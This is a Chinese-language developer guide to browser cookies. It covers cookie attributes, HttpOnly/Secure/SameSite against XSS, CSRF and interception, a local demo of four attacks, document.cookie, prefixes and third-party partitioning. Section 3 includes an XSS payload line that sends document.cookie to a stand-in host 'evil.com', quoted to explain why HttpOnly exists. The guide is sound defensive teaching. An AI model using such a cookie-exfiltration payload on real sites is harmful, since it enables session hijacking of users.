# Cookie

[返回存储目录](../README.md) · [仓库首页](../../../../README.md)

> 浏览器保存的小段字符串数据，在满足 domain、path、secure、SameSite 等条件时自动附加到 HTTP 请求。它既是客户端存储，也参与 HTTP 状态管理，不能简单视为一个 JavaScript 键值数据库。

## 1. 写入与发送

服务端通过 `Set-Cookie` 响应头写入 Cookie：

```http
HTTP/1.1 200 OK
Set-Cookie: __Host-session=opaque-id; Path=/; Secure; HttpOnly; SameSite=Lax
```

后续请求满足匹配条件时，浏览器自动发送：

```http
GET /account HTTP/1.1
Cookie: __Host-session=opaque-id
```

前端无需、也不应读取 HttpOnly 会话 Cookie。浏览器能发送某个 Cookie，不代表服务端可以省略权限校验；服务端仍需验证会话、用户身份与资源授权。

## 2. 属性总览

| 属性          | 主要语义                                                   |
| ------------- | ---------------------------------------------------------- |
| `Domain`      | 指定可接收 Cookie 的 host 范围；省略时为 host-only         |
| `Path`        | 控制请求路径匹配，不是安全边界                             |
| `Expires`     | 绝对过期时间                                               |
| `Max-Age`     | 相对存活秒数，存在时优先于 `Expires`                       |
| `Secure`      | 仅在安全传输条件下发送                                     |
| `HttpOnly`    | 禁止 `document.cookie` 读取，仍可随请求发送                |
| `SameSite`    | 限制跨站请求携带，取值 `Strict`、`Lax`、`None`             |
| `Partitioned` | 请求将 Cookie 存入分区存储（CHIPS），要求同时设置 `Secure` |

`Domain` 与 `Path` 决定发送范围，却不能防止同源或匹配路径中的其他代码带上 Cookie 发请求。不要把 `Path=/admin` 当成访问控制。

其中 `Secure`、`HttpOnly`、`SameSite` 是三个安全属性，分别约束传输通道、脚本读取和跨站携带，各对应一条经典攻击路径，见下节。

## 3. 安全属性与常见攻击

### HttpOnly：防 XSS 窃取

脚本能通过 `document.cookie` 读取所有非 HttpOnly 的 Cookie。反射型或存储型 XSS 一旦执行，`new Image().src = "https://evil.com/?c=" + document.cookie` 就能把会话标识外传。

`HttpOnly` 让会话 Cookie 对脚本不可见，直接切断这条窃取路径。但它只防"读"不防"用"：若 XSS 已能在页面中执行，攻击者仍可借用户现有会话在同源内发起请求（此时 Cookie 照常附带）。因此 HttpOnly 需与 CSP、输入输出转义、敏感操作二次校验等纵深防护配合，详见 [MDN：XSS](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)。

### Secure：防明文截获

带 `Secure` 的 Cookie 只在安全通道（HTTPS）上发送，避免会话在 HTTP 明文传输或降级请求中被网络中间人截获。`SameSite=None` 必须同时设置 `Secure`，否则现代浏览器会拒绝写入。

> 本地开发例外：localhost 属于安全上下文，Chrome/Firefox 允许通过 `http://localhost` 设置和发送 `Secure` Cookie，Safari 更严格。生产环境必须全程 HTTPS，不要依赖该特例。

### SameSite：防跨站携带（CSRF）

CSRF 的前提是：受害浏览器向目标站点发请求时自动附带会话 Cookie，攻击者站点借这道"自动附带"伪造用户操作。`SameSite` 从源头限制跨站请求是否携带：

| 取值     | 跨站行为                                                                            |
| -------- | ----------------------------------------------------------------------------------- |
| `Strict` | 完全不随跨站请求发送                                                                |
| `Lax`    | 只随顶级导航的安全方法（GET 等）发送；跨站 POST 表单和 img/fetch 等子资源一律不携带 |
| `None`   | 不做限制，跨站照常携带，必须配合 `Secure`                                           |

Lax 保留顶级 GET 导航是有意取舍：保证用户从外站点链接跳转过来仍是登录态。代价是，如果服务端在 GET 上做状态变更，Lax 也拦不住。完整 CSRF 攻击面见 [MDN：CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)。

关于 site 的判定，注意两点：

- site 与同源策略的 origin 不是同一概念：site 由 scheme + registrable domain 决定，忽略端口。`localhost:3000` 与 `localhost:3001` 跨源但同站；而 `localhost` 与 `127.0.0.1` 是跨站的（host 不同）。
- 未声明 SameSite 时，Chrome 自 80 起默认按 Lax 处理（并有设置后 2 分钟内允许顶级跨站 POST 的 "Lax + POST" 宽限），其他浏览器策略不一。应显式声明 SameSite，不依赖默认值。

### 攻击与防护对照

| 攻击           | 载体                         | 主要防线                     | 服务端仍需                      |
| -------------- | ---------------------------- | ---------------------------- | ------------------------------- |
| XSS 窃取会话   | 同源脚本读 `document.cookie` | `HttpOnly`                   | 输出转义、CSP、敏感操作校验     |
| CSRF 跨站 POST | 自动提交的跨站表单           | `SameSite=Lax/Strict`        | CSRF token、Origin/Referer 校验 |
| CSRF 跨站 GET  | img 子资源 / 顶级导航链接    | `SameSite=Lax`（仅拦子资源） | GET 不做状态变更 + token        |
| 明文截获       | HTTP 传输 / 降级请求         | `Secure`                     | 全站 HTTPS、HSTS                |

> 三个属性都是浏览器侧的约束：浏览器据此决定"要不要带上 Cookie"。服务端不能假设客户端一定配合——恶意客户端可以构造任意请求。SameSite 是纵深防御中的一层，CSRF token 与 Origin 校验不可省略。

## 4. 可运行 Demo：Node 复现攻击与防护

[同目录的 `index.ts`](index.ts) 用零依赖的 `node:http` 起了两个"站点"：受害方 bank 运行在 `http://localhost:3000`，攻击方 evil 运行在 `http://127.0.0.1:3001`（两者 host 不同，构成真实跨站）。bank 提供两种登录变体：

| 登录变体   | Set-Cookie                                      |
| ---------- | ----------------------------------------------- |
| `legacy`   | `sid=…; Path=/; SameSite=None; Secure`          |
| `hardened` | `sid=…; Path=/; Secure; HttpOnly; SameSite=Lax` |

在仓库根目录使用 Node >= 22.18 运行，按 `Ctrl+C` 停止服务：

```bash
node docs/browser/storage/cookie/index.ts
```

CLI 仅在两个服务都监听成功后输出地址、操作步骤和观察方式；终端记录状态码、Cookie 携带与 Origin，浏览器 Network 用于查看 Cookie/Set-Cookie。两个服务都只监听本机，页面和重定向响应使用 `no-store`。

默认端口被占用时可在仓库根目录切换，按 `Ctrl+C` 同时停止两个服务：

```bash
BANK_PORT=3002 EVIL_PORT=3003 node docs/browser/storage/cookie/index.ts
```

保持 bank 使用 localhost、evil 使用 127.0.0.1；端口改变不会改变这组跨站关系。浏览器策略也可能额外限制 Cookie，需结合实际请求判断。

在 Chrome/Firefox 中打开 bank 首页登录一个变体，再到 evil 控制台依次执行四个攻击，然后换一个变体重复，对比结果：

| evil 攻击页        | 请求形态                      | `legacy`              | `hardened`              | 结论                              |
| ------------------ | ----------------------------- | --------------------- | ----------------------- | --------------------------------- |
| 攻击 1 `/csrf`     | 跨站顶级 POST 表单            | Cookie 附带，转账执行 | Cookie 不附带，转账被拒 | `SameSite=Lax` 拦截               |
| 攻击 2 `/img-get`  | 跨站 GET 子资源（img）        | Cookie 附带，赠送执行 | Cookie 不附带，赠送被拒 | `SameSite=Lax` 拦截               |
| 攻击 3 `/link-get` | 跨站顶级 GET 导航             | Cookie 附带，赠送执行 | Cookie 仍附带，赠送执行 | Lax 放行顶级 GET，只能靠 GET 只读 |
| 攻击 4 `/comment`  | bank 页面内反射 XSS 读 Cookie | `sid` 被回传窃取      | 读到空值                | `HttpOnly` 拦截                   |

终端会打印每个请求是否携带 Cookie（`cookie=sid…` / `cookie=absent`）以及 Origin 头，可对照观察。

> 必须用 `127.0.0.1` 打开 evil 页面：端口不参与 site 计算，若 evil 也用 `localhost:3001` 打开，它与 bank 同站，SameSite 不会拦截，演示会失真。`Secure` 的"拒绝在非安全通道发送"无法在 localhost 上演示（localhost 被视为安全上下文），需要真实 HTTP 站点才能观察到差异。

## 5. Host-only、Domain 与 Cookie prefix

省略 `Domain` 时，Cookie 只发送给设置它的 host；显式设置 `Domain=example.com` 时，它也可能发送给符合规则的子域。

Cookie prefix 可把部分安全约束编码进名称。例如 `__Host-` Cookie 必须：

- 由安全来源设置并带 `Secure`；
- 使用 `Path=/`；
- 不带 `Domain`。

因此 `__Host-session` 能减少子域或路径配置带来的覆盖风险。prefix 是配置约束，不替代随机、不可预测的会话标识和服务端校验。

## 6. document.cookie

非 HttpOnly Cookie 可由 JavaScript 通过 `document.cookie` 访问。该 API 是同步字符串接口：读取会得到当前文档可见 Cookie 的拼接结果，赋值一次只设置一个 Cookie。

```js
const oneWeek = 7 * 24 * 60 * 60

document.cookie = ["theme=dark", `Max-Age=${oneWeek}`, "Path=/", "SameSite=Lax", "Secure"].join(
  "; "
)
```

删除 Cookie 不是调用单独的 delete API，而是使用相同的 name、domain 与 path 范围，将其设为过期：

```js
document.cookie = ["theme=", "Max-Age=0", "Path=/", "SameSite=Lax", "Secure"].join("; ")
```

如果设置时用了不同的 `Path` 或 `Domain`，这段删除代码可能只创建/删除另一个同名条目。业务封装应集中管理这些属性。

`document.cookie` 不能设置或读取 `HttpOnly`，并且同步读取可能涉及跨进程查询。高频访问时应把解析结果缓存在应用内；支持范围允许时，也可评估异步的 [Cookie Store API](https://developer.mozilla.org/en-US/docs/Web/API/Cookie_Store_API)。

## 7. Cookie 不是 session，也不是 token

- session 是服务端保存状态并通过某个标识关联请求的模型。
- Cookie 是浏览器保存和传输状态的机制。
- token 是凭证或声明的格式。

常见做法是把随机 session ID 放入 HttpOnly Cookie。把 access token 放在 `localStorage` 可避免浏览器自动携带，但同源 JavaScript 和成功执行的 XSS 可以读取它；放入 HttpOnly Cookie 可以阻止脚本直接读取，却需要设计 CSRF 防护。不存在脱离威胁模型的"绝对安全存储位置"。

Cookie 在 HTTP 状态管理中的使用见 [MDN：Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)。

## 8. 第三方 Cookie 与分区

第三方上下文中的 Cookie 越来越受到浏览器默认策略、用户设置和分区机制限制。`Partitioned` 属性用于 CHIPS：Cookie 会按顶层站点分区，使同一个第三方嵌入不同站点时不再共享同一份状态。

不要依赖"所有浏览器都会允许第三方 Cookie"。嵌入式登录、支付或小组件应按目标浏览器测试，并在需要访问未分区状态时评估 Storage Access API 等明确授权机制。

## 9. 大小与性能

Cookie 会随所有匹配请求发送，因此它更适合小型状态标识，不适合保存大型 JSON、用户资料或离线数据。具体单条大小和数量限制由浏览器实现决定；超过限制可能被拒绝或淘汰，不应依赖一个固定数字。

如果数据只供客户端使用，可考虑 Web Storage 或 IndexedDB；如果数据是可重新获取的 response，可考虑 HTTP cache 或 Cache Storage。

## 10. 兼容性与检测

基础 Cookie 和常用属性兼容性很好，但 `Partitioned`、Cookie Store API 及第三方 Cookie 政策存在差异。服务端应在实际请求上验证 Cookie 是否到达，前端不要仅凭写入代码未报错就推断成功。

兼容性见 [MDN：Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#browser_compatibility)、[MDN：Document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie#browser_compatibility) 与 [MDN：Cookie Store API](https://developer.mozilla.org/en-US/docs/Web/API/Cookie_Store_API#browser_compatibility)。

## 11. 面试回答框架

先说明 Cookie 会按规则自动随请求发送，这正是它方便又危险的原因；再解释 `Secure`、`HttpOnly` 与 `SameSite` 分别约束传输、脚本读取和跨站携带，并各对应一条攻击路径（明文截获、XSS 窃取、CSRF），可引用本目录 demo 的四组对照实验；随后区分 Cookie、session 和 token；最后强调三个属性都是浏览器侧防线，服务端仍需 CSRF token / Origin 校验与"GET 只读"，并补充第三方 Cookie 限制与分区。

## 12. 参考资料

- [RFC 6265bis：Cookies](https://httpwg.org/http-extensions/draft-ietf-httpbis-rfc6265bis.html)
- [MDN：Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)
- [MDN：Secure cookie configuration](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Cookies)
- [web.dev：SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained)
